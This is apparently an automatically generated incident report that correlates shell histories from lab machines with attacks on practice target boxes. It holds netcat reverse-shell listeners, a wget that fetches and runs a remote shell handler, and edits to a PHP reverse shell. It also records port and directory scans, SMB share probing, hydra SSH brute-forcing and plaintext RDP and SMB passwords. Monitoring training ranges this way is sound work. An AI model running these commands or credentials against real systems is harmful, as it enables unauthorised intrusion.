# Concurrent Exploit Incidents

## Incident 1 - 2026-01-08T19:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:00:24 | logs/10.100.7.21/shell_history.csv#L1 | exit
  - 2026-01-08T19:00:30 | logs/10.100.7.21/shell_history.csv#L2 | cat .full_research_history.csv
  - 2026-01-08T19:00:25 | logs/10.100.7.22/shell_history.csv#L1 | exit
  - 2026-01-08T19:00:28 | logs/10.100.7.22/shell_history.csv#L2 | cat .full_research_history.csv

## Incident 2 - 2026-01-08T19:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:02:23 | logs/10.100.7.21/shell_history.csv#L3 | sudo bash
  - 2026-01-08T19:02:41 | logs/10.100.7.21/shell_history.csv#L4 | sudo bash
  - 2026-01-08T19:02:25 | logs/10.100.7.22/shell_history.csv#L3 | sudo bash
  - 2026-01-08T19:02:39 | logs/10.100.7.22/shell_history.csv#L4 | sudo bash

## Incident 3 - 2026-01-20T19:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:59:07 | logs/10.100.7.21/shell_history.csv#L5 | exit
  - 2026-01-20T19:59:13 | logs/10.100.7.21/shell_history.csv#L6 | exit
  - 2026-01-20T19:59:54 | logs/10.100.7.32/shell_history.csv#L447 | nc -nlvp 4444
  - 2026-01-20T19:59:33 | logs/10.100.7.14/shell_history.csv#L168 | wordlist
  - 2026-01-20T19:59:36 | logs/10.100.7.14/shell_history.csv#L169 | exit
  - 2026-01-20T19:59:59 | logs/10.100.7.14/shell_history.csv#L170 | cd dirbuster

## Incident 4 - 2026-01-20T20:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:01:33 | logs/10.100.7.21/shell_history.csv#L7 | clear
  - 2026-01-20T20:01:57 | logs/10.100.7.21/shell_history.csv#L8 | ls

## Incident 5 - 2026-01-20T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:02:05 | logs/10.100.7.21/shell_history.csv#L9 | cat dirbuster
  - 2026-01-20T20:02:19 | logs/10.100.7.21/shell_history.csv#L10 | cd dirbuster
  - 2026-01-20T20:02:23 | logs/10.100.7.21/shell_history.csv#L11 | ls
  - 2026-01-20T20:02:15 | logs/10.100.7.11/shell_history.csv#L117 | tldr systemctl
  - 2026-01-20T20:02:53 | logs/10.100.7.11/shell_history.csv#L118 | systemctl status sshd

## Incident 6 - 2026-01-20T20:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:04:40 | logs/10.100.7.21/shell_history.csv#L12 | ls
  - 2026-01-20T20:04:42 | logs/10.100.7.33/shell_history.csv#L75 | tldr smbclient

## Incident 7 - 2026-01-20T20:04:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-20T20:04:07 | logs/10.100.7.14/shell_history.csv#L176 | gobuster dir -u http:// 10.100.7.41 -w /usr/share/dirb/wordlists/common.txt
  - 2026-01-20T20:04:51 | logs/10.100.7.14/shell_history.csv#L177 | gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.100.7.41

## Incident 8 - 2026-01-20T20:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:08:25 | logs/10.100.7.21/shell_history.csv#L15 | ls
  - 2026-01-20T20:08:42 | logs/10.100.7.21/shell_history.csv#L16 | head apache-user-enum-2.0.txt
  - 2026-01-20T20:08:52 | logs/10.100.7.21/shell_history.csv#L17 | tail apache-user-enum-2.0.txt

## Incident 9 - 2026-01-20T20:09:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:09:39 | logs/10.100.7.21/shell_history.csv#L18 | tail apache-user-enum-2.0.txt
  - 2026-01-20T20:09:54 | logs/10.100.7.21/shell_history.csv#L19 | tail directories.jbrofuzz
  - 2026-01-20T20:09:48 | logs/10.100.7.32/shell_history.csv#L449 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py

## Incident 10 - 2026-01-20T20:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:10:27 | logs/10.100.7.21/shell_history.csv#L20 | tail directory-list-1.0.txt
  - 2026-01-20T20:10:13 | logs/10.100.7.22/shell_history.csv#L159 | cd wordlist
  - 2026-01-20T20:10:15 | logs/10.100.7.22/shell_history.csv#L160 | ls
  - 2026-01-20T20:10:18 | logs/10.100.7.22/shell_history.csv#L161 | cd ~
  - 2026-01-20T20:10:19 | logs/10.100.7.22/shell_history.csv#L162 | ls

## Incident 11 - 2026-01-20T20:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:12:18 | logs/10.100.7.21/shell_history.csv#L21 | tail directory-list-1.0.txt
  - 2026-01-20T20:12:37 | logs/10.100.7.21/shell_history.csv#L22 | tail directory-list-1.0.txt
  - 2026-01-20T20:12:45 | logs/10.100.7.21/shell_history.csv#L23 | cd /usr/share/dirb/wordlists
  - 2026-01-20T20:12:47 | logs/10.100.7.21/shell_history.csv#L24 | ls

## Incident 12 - 2026-01-20T20:12:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-20T20:12:24 | logs/10.100.7.33/shell_history.csv#L77 | smbclient //10.100.7.42/public
  - 2026-01-20T20:12:54 | logs/10.100.7.33/shell_history.csv#L78 | smbclient //10.100.7.42/IPC$
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 13 - 2026-01-20T20:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:13:00 | logs/10.100.7.21/shell_history.csv#L25 | tail big.txt
  - 2026-01-20T20:13:14 | logs/10.100.7.21/shell_history.csv#L26 | tail catala.txt
  - 2026-01-20T20:13:31 | logs/10.100.7.21/shell_history.csv#L27 | tail common.txt

## Incident 14 - 2026-01-20T20:13:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-20T20:13:05 | logs/10.100.7.33/shell_history.csv#L79 | smbclient //10.100.7.42/Admin
  - 2026-01-20T20:13:23 | logs/10.100.7.33/shell_history.csv#L80 | smbclient //10.100.7.42/C$
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 15 - 2026-01-20T20:20:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-20T20:20:30 | logs/10.100.7.21/shell_history.csv#L30 | gobuster dir -u http://10.100.7.41/ -w common.txt
  - 2026-01-20T20:20:47 | logs/10.100.7.21/shell_history.csv#L31 | gobuster dir -u http://10.100.7.41/ -w common.txt

## Incident 16 - 2026-01-20T20:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:20:30 | logs/10.100.7.33/shell_history.csv#L82 | tldr rpc
  - 2026-01-20T20:20:31 | logs/10.100.7.22/shell_history.csv#L163 | /usr/share/webshells/
  - 2026-01-20T20:20:34 | logs/10.100.7.22/shell_history.csv#L164 | cd /usr/share/webshells/
  - 2026-01-20T20:20:35 | logs/10.100.7.22/shell_history.csv#L165 | ls
  - 2026-01-20T20:20:40 | logs/10.100.7.22/shell_history.csv#L166 | cd php
  - 2026-01-20T20:20:41 | logs/10.100.7.22/shell_history.csv#L167 | ls

## Incident 17 - 2026-01-20T20:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:23:42 | logs/10.100.7.21/shell_history.csv#L32 | ls
  - 2026-01-20T20:23:44 | logs/10.100.7.21/shell_history.csv#L33 | cd ~
  - 2026-01-20T20:23:45 | logs/10.100.7.21/shell_history.csv#L34 | ls
  - 2026-01-20T20:23:17 | logs/10.100.7.14/shell_history.csv#L186 | wordlists
  - 2026-01-20T20:23:34 | logs/10.100.7.22/shell_history.csv#L171 | ls

## Incident 18 - 2026-01-20T20:23:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-20T20:23:02 | logs/10.100.7.14/shell_history.csv#L182 | nmap 10.100.7.42
  - 2026-01-20T20:23:14 | logs/10.100.7.14/shell_history.csv#L183 | nmap 10.100.7.42
  - 2026-01-20T20:23:14 | logs/10.100.7.14/shell_history.csv#L184 | nmap 10.100.7.42
  - 2026-01-20T20:23:15 | logs/10.100.7.14/shell_history.csv#L185 | nmap 10.100.7.42
  - 2026-01-20T20:23:23 | logs/10.100.7.14/shell_history.csv#L187 | nmap 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 19 - 2026-01-20T20:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:24:03 | logs/10.100.7.21/shell_history.csv#L35 | cd /user/share/webshells/php
  - 2026-01-20T20:24:20 | logs/10.100.7.21/shell_history.csv#L36 | cd /usr/share/webshells/php
  - 2026-01-20T20:24:21 | logs/10.100.7.21/shell_history.csv#L37 | ls

## Incident 20 - 2026-01-20T20:24:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-20T20:24:35 | logs/10.100.7.14/shell_history.csv#L190 | nxc smb 10.100.7.44  -u guest -p ‘ ‘
  - 2026-01-20T20:24:44 | logs/10.100.7.14/shell_history.csv#L191 | nmap 10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 21 - 2026-01-20T20:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:26:12 | logs/10.100.7.21/shell_history.csv#L38 | vim php-reverse-shell.php
  - 2026-01-20T20:26:05 | logs/10.100.7.11/shell_history.csv#L125 | ls
  - 2026-01-20T20:26:18 | logs/10.100.7.11/shell_history.csv#L126 | cp php-rev-shell.php php-rev-shell-copy.php
  - 2026-01-20T20:26:19 | logs/10.100.7.11/shell_history.csv#L127 | ls
  - 2026-01-20T20:26:02 | logs/10.100.7.33/shell_history.csv#L86 | cat readme.txt

## Incident 22 - 2026-01-20T20:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:32:07 | logs/10.100.7.21/shell_history.csv#L41 | chmod u+w php-reverse-shell.php
  - 2026-01-20T20:32:41 | logs/10.100.7.21/shell_history.csv#L42 | sudo chmod u+w php-reverse-shell.php

## Incident 23 - 2026-01-20T20:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:33:45 | logs/10.100.7.21/shell_history.csv#L43 | vim php-reverse-shell.php
  - 2026-01-20T20:33:47 | logs/10.100.7.21/shell_history.csv#L44 | clear
  - 2026-01-20T20:33:13 | logs/10.100.7.33/shell_history.csv#L87 | tldr rpcinfor
  - 2026-01-20T20:33:16 | logs/10.100.7.33/shell_history.csv#L88 | tldr rpcinfo

## Incident 24 - 2026-01-27T19:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:01:22 | logs/10.100.7.21/shell_history.csv#L46 | wordlists
  - 2026-01-27T19:01:33 | logs/10.100.7.11/shell_history.csv#L184 | nc -lvnp 4444

## Incident 25 - 2026-01-27T19:01:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:01:55 | logs/10.100.7.34/shell_history.csv#L64 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T19:01:01 | logs/10.100.7.14/shell_history.csv#L309 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:13 | logs/10.100.7.14/shell_history.csv#L310 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:33 | logs/10.100.7.14/shell_history.csv#L311 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:46 | logs/10.100.7.14/shell_history.csv#L312 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:50 | logs/10.100.7.14/shell_history.csv#L313 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:01:55 | logs/10.100.7.14/shell_history.csv#L314 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:31 | logs/10.100.7.22/shell_history.csv#L182 | nxc smb 10.100.7.46 -u [user] -p [password]
  - 2026-01-27T19:01:10 | logs/10.100.7.24/shell_history.csv#L254 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:20 | logs/10.100.7.24/shell_history.csv#L255 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:43 | logs/10.100.7.24/shell_history.csv#L256 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:52 | logs/10.100.7.24/shell_history.csv#L257 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 26 - 2026-01-27T19:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:05:35 | logs/10.100.7.21/shell_history.csv#L47 | netstat -n | findstr :3389
  - 2026-01-27T19:05:27 | logs/10.100.7.11/shell_history.csv#L187 | smbclient //ember/ADMIN --user EMBER
  - 2026-01-27T19:05:39 | logs/10.100.7.11/shell_history.csv#L188 | smbclient //ember/ADMIN --user EMBER
  - 2026-01-27T19:05:46 | logs/10.100.7.34/shell_history.csv#L70 | smbclient //server/share --user guest
  - 2026-01-27T19:05:27 | logs/10.100.7.24/shell_history.csv#L267 | vim maintenance.ps1

## Incident 27 - 2026-01-27T19:05:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:05:43 | logs/10.100.7.14/shell_history.csv#L320 | gobuster dir -u http://10.100.7.45 -w /usr/share/dirb/wordlists/common.txt
  - 2026-01-27T19:05:12 | logs/10.100.7.22/shell_history.csv#L191 | nxc smb 10.100.7.45 -u guest -p "
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 28 - 2026-01-27T19:05:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-27T19:05:23 | logs/10.100.7.22/shell_history.csv#L192 | nxc smb 10.100.7.44 -u guest -p "
  - 2026-01-27T19:05:37 | logs/10.100.7.22/shell_history.csv#L193 | nxc smb 10.100.7.44 -u helios -p "
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 29 - 2026-01-27T19:09:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:09:42 | logs/10.100.7.21/shell_history.csv#L48 | clear
  - 2026-01-27T19:09:07 | logs/10.100.7.11/shell_history.csv#L190 | smbclient //ember/Scripts --user EMBER$
  - 2026-01-27T19:09:09 | logs/10.100.7.11/shell_history.csv#L191 | ls
  - 2026-01-27T19:09:14 | logs/10.100.7.11/shell_history.csv#L192 | cat maintenance.ps1
  - 2026-01-27T19:09:00 | logs/10.100.7.32/shell_history.csv#L644 | cat maintenance.ps1

## Incident 30 - 2026-01-27T19:09:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:09:24 | logs/10.100.7.14/shell_history.csv#L321 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:09:58 | logs/10.100.7.14/shell_history.csv#L322 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:09:47 | logs/10.100.7.24/shell_history.csv#L268 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 31 - 2026-01-27T19:09:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:09:01 | logs/10.100.7.22/shell_history.csv#L199 | nxc smb 10.100.7.40 -u solaris -p "
  - 2026-01-27T19:09:39 | logs/10.100.7.22/shell_history.csv#L200 | nxc smb 10.100.7.40 -u solaris -p " --shares

## Incident 32 - 2026-01-27T19:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:10:02 | logs/10.100.7.21/shell_history.csv#L49 | ls
  - 2026-01-27T19:10:05 | logs/10.100.7.21/shell_history.csv#L50 | cd ..
  - 2026-01-27T19:10:06 | logs/10.100.7.21/shell_history.csv#L51 | ls
  - 2026-01-27T19:10:09 | logs/10.100.7.21/shell_history.csv#L52 | clear
  - 2026-01-27T19:10:11 | logs/10.100.7.21/shell_history.csv#L53 | cd ~
  - 2026-01-27T19:10:12 | logs/10.100.7.21/shell_history.csv#L54 | ls
  - 2026-01-27T19:10:31 | logs/10.100.7.21/shell_history.csv#L55 | cd /use
  - 2026-01-27T19:10:34 | logs/10.100.7.21/shell_history.csv#L56 | cd /user
  - 2026-01-27T19:10:37 | logs/10.100.7.21/shell_history.csv#L57 | cd ~
  - 2026-01-27T19:10:39 | logs/10.100.7.21/shell_history.csv#L58 | cd ..
  - 2026-01-27T19:10:42 | logs/10.100.7.21/shell_history.csv#L59 | ls
  - 2026-01-27T19:10:49 | logs/10.100.7.21/shell_history.csv#L60 | ls -a
  - 2026-01-27T19:10:53 | logs/10.100.7.21/shell_history.csv#L61 | cd ~
  - 2026-01-27T19:10:59 | logs/10.100.7.21/shell_history.csv#L62 | cd ls -a
  - 2026-01-27T19:10:49 | logs/10.100.7.22/shell_history.csv#L201 | put[IPC$]

## Incident 33 - 2026-01-27T19:10:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:10:08 | logs/10.100.7.14/shell_history.csv#L323 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:10:17 | logs/10.100.7.14/shell_history.csv#L324 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:10:05 | logs/10.100.7.24/shell_history.csv#L269 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:10:14 | logs/10.100.7.24/shell_history.csv#L270 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 34 - 2026-01-27T19:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:11:02 | logs/10.100.7.21/shell_history.csv#L63 | ls -a
  - 2026-01-27T19:11:37 | logs/10.100.7.11/shell_history.csv#L193 | nc -lvnp 4444
  - 2026-01-27T19:11:41 | logs/10.100.7.11/shell_history.csv#L194 | git
  - 2026-01-27T19:11:44 | logs/10.100.7.11/shell_history.csv#L195 | ls
  - 2026-01-27T19:11:57 | logs/10.100.7.11/shell_history.csv#L196 | ls
  - 2026-01-27T19:11:57 | logs/10.100.7.33/shell_history.csv#L110 | tldr ssh
  - 2026-01-27T19:11:36 | logs/10.100.7.32/shell_history.csv#L645 | vi maintenance.ps1
  - 2026-01-27T19:11:40 | logs/10.100.7.32/shell_history.csv#L647 | ls
  - 2026-01-27T19:11:48 | logs/10.100.7.32/shell_history.csv#L648 | ls
  - 2026-01-27T19:11:50 | logs/10.100.7.32/shell_history.csv#L649 | cat maintenance.ps1
  - 2026-01-27T19:11:04 | logs/10.100.7.22/shell_history.csv#L202 | put [IPC$]

## Incident 35 - 2026-01-27T19:11:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:11:40 | logs/10.100.7.32/shell_history.csv#L646 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:11:01 | logs/10.100.7.14/shell_history.csv#L325 | nmap 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 36 - 2026-01-27T19:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:12:33 | logs/10.100.7.21/shell_history.csv#L65 | find /etc
  - 2026-01-27T19:12:45 | logs/10.100.7.21/shell_history.csv#L66 | clear
  - 2026-01-27T19:12:59 | logs/10.100.7.14/shell_history.csv#L326 | winrm quickconfig
  - 2026-01-27T19:12:07 | logs/10.100.7.22/shell_history.csv#L203 | smb client
  - 2026-01-27T19:12:24 | logs/10.100.7.22/shell_history.csv#L204 | smbclient
  - 2026-01-27T19:12:04 | logs/10.100.7.12/shell_history.csv#L44 | ps aux | grep fox
  - 2026-01-27T19:12:09 | logs/10.100.7.12/shell_history.csv#L45 | systemctl restart xrdp
  - 2026-01-27T19:12:25 | logs/10.100.7.12/shell_history.csv#L46 | sudo systemctl restart xrdp

## Incident 37 - 2026-01-27T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:13:10 | logs/10.100.7.21/shell_history.csv#L67 | cd /etc
  - 2026-01-27T19:13:11 | logs/10.100.7.21/shell_history.csv#L68 | ls
  - 2026-01-27T19:13:11 | logs/10.100.7.14/shell_history.csv#L327 | evilwinrm quickconfig
  - 2026-01-27T19:13:19 | logs/10.100.7.14/shell_history.csv#L328 | evl-winrm quickconfig
  - 2026-01-27T19:13:30 | logs/10.100.7.14/shell_history.csv#L329 | evil-winrm quickconfig
  - 2026-01-27T19:13:47 | logs/10.100.7.14/shell_history.csv#L330 | tldr evil-winrm

## Incident 38 - 2026-01-27T19:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:15:01 | logs/10.100.7.21/shell_history.csv#L69 | cd ~
  - 2026-01-27T19:15:12 | logs/10.100.7.21/shell_history.csv#L70 | cd /user
  - 2026-01-27T19:15:15 | logs/10.100.7.21/shell_history.csv#L71 | cd /etc
  - 2026-01-27T19:15:20 | logs/10.100.7.21/shell_history.csv#L72 | clear
  - 2026-01-27T19:15:22 | logs/10.100.7.21/shell_history.csv#L73 | cd ~
  - 2026-01-27T19:15:25 | logs/10.100.7.21/shell_history.csv#L74 | ls
  - 2026-01-27T19:15:27 | logs/10.100.7.21/shell_history.csv#L75 | ls -a

## Incident 39 - 2026-01-27T19:15:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:15:36 | logs/10.100.7.32/shell_history.csv#L652 | nxc smb 10.100.7.46 -u rand2 -p 'f?D07VdW6S$)' --shares
  - 2026-01-27T19:15:51 | logs/10.100.7.32/shell_history.csv#L653 | smbclient //10.100.7.46/Scripts --user guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 40 - 2026-01-27T19:16:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:16:19 | logs/10.100.7.21/shell_history.csv#L76 | cd /usr/share/wordlists
  - 2026-01-27T19:16:21 | logs/10.100.7.21/shell_history.csv#L77 | ls
  - 2026-01-27T19:16:39 | logs/10.100.7.21/shell_history.csv#L78 | gzip -d rockyou.txt.gz
  - 2026-01-27T19:16:49 | logs/10.100.7.21/shell_history.csv#L79 | sudo gzip -d rockyou.txt.gz
  - 2026-01-27T19:16:50 | logs/10.100.7.21/shell_history.csv#L80 | ls

## Incident 41 - 2026-01-27T19:18:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-27T19:18:00 | logs/10.100.7.21/shell_history.csv#L81 | hydra -I forge -P rockyou.txt 10.100.7.44 ssh
  - 2026-01-27T19:18:30 | logs/10.100.7.21/shell_history.csv#L82 | sudo hydra -I forge -P rockyou.txt 10.100.7.44 ssh
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 42 - 2026-01-27T19:18:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:18:01 | logs/10.100.7.32/shell_history.csv#L654 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:18:04 | logs/10.100.7.32/shell_history.csv#L655 | nxc smb 10.100.7.46 -u rand2 -p 'f?D07VdW6S$)' --shares
  - 2026-01-27T19:18:27 | logs/10.100.7.14/shell_history.csv#L334 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:18:44 | logs/10.100.7.14/shell_history.csv#L335 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 43 - 2026-01-27T19:18:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:18:00 | logs/10.100.7.22/shell_history.csv#L214 | smbclient -L //10.100.7.40/public -U guest -p "
  - 2026-01-27T19:18:16 | logs/10.100.7.22/shell_history.csv#L215 | smbclient -L //10.100.7.40/public -U solaris -p "

## Incident 44 - 2026-01-27T19:19:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-27T19:19:05 | logs/10.100.7.21/shell_history.csv#L83 | hydra -I forge -P rockyou.txt ssh 10.100.7.44
  - 2026-01-27T19:19:17 | logs/10.100.7.21/shell_history.csv#L84 | hydra -l forge -P rockyou.txt ssh 10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 45 - 2026-01-27T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:19:27 | logs/10.100.7.21/shell_history.csv#L85 | hydra -h
  - 2026-01-27T19:19:54 | logs/10.100.7.32/shell_history.csv#L656 | tldr smbclient
  - 2026-01-27T19:19:12 | logs/10.100.7.22/shell_history.csv#L217 | ls
  - 2026-01-27T19:19:30 | logs/10.100.7.22/shell_history.csv#L218 | unzip backup.zip
  - 2026-01-27T19:19:35 | logs/10.100.7.22/shell_history.csv#L219 | ls
  - 2026-01-27T19:19:54 | logs/10.100.7.22/shell_history.csv#L220 | vim credentials.txt

## Incident 46 - 2026-01-27T19:19:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:19:42 | logs/10.100.7.33/shell_history.csv#L114 | nxc smb 10.100.7.46 -p '' --shares
  - 2026-01-27T19:19:22 | logs/10.100.7.14/shell_history.csv#L336 | nmap 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 47 - 2026-01-27T19:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:20:35 | logs/10.100.7.21/shell_history.csv#L86 | wordlists
  - 2026-01-27T19:20:35 | logs/10.100.7.33/shell_history.csv#L116 | tldr nxc
  - 2026-01-27T19:20:31 | logs/10.100.7.32/shell_history.csv#L657 | ls
  - 2026-01-27T19:20:44 | logs/10.100.7.32/shell_history.csv#L658 | vi maintenance.ps1
  - 2026-01-27T19:20:01 | logs/10.100.7.22/shell_history.csv#L221 | vim credentials.txt
  - 2026-01-27T19:20:14 | logs/10.100.7.22/shell_history.csv#L222 | vim credentials.txt

## Incident 48 - 2026-01-27T19:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:21:07 | logs/10.100.7.21/shell_history.csv#L87 | cd /usr/share
  - 2026-01-27T19:21:08 | logs/10.100.7.21/shell_history.csv#L88 | ls
  - 2026-01-27T19:21:16 | logs/10.100.7.21/shell_history.csv#L89 | cd /usr/share/nmap
  - 2026-01-27T19:21:18 | logs/10.100.7.21/shell_history.csv#L90 | ls
  - 2026-01-27T19:21:24 | logs/10.100.7.21/shell_history.csv#L91 | cd scripts
  - 2026-01-27T19:21:26 | logs/10.100.7.21/shell_history.csv#L92 | ls
  - 2026-01-27T19:21:33 | logs/10.100.7.14/shell_history.csv#L339 | exit
  - 2026-01-27T19:21:06 | logs/10.100.7.22/shell_history.csv#L223 | vim credentials.txt
  - 2026-01-27T19:21:12 | logs/10.100.7.22/shell_history.csv#L224 | rm credentials.txt
  - 2026-01-27T19:21:18 | logs/10.100.7.22/shell_history.csv#L225 | unzip backup.zip
